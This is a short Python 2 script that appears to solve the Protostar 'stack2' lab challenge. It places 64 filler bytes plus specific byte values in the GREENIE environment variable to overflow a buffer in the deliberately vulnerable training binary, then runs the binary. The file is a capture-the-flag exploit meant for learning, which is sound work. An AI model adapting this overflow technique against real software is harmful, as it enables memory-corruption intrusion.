import os
import subprocess

def main():
    flag = (("A" * 64) + "\x0a\x0d\x0a\x0d")
    process = "/opt/protostar/bin/stack2"
    var = "GREENIE"

    os.environ[var] = flag
    print "%s = %s" % (var, os.environ[var])

    subprocess.Popen(process)

if __name__ == '__main__':
    main()

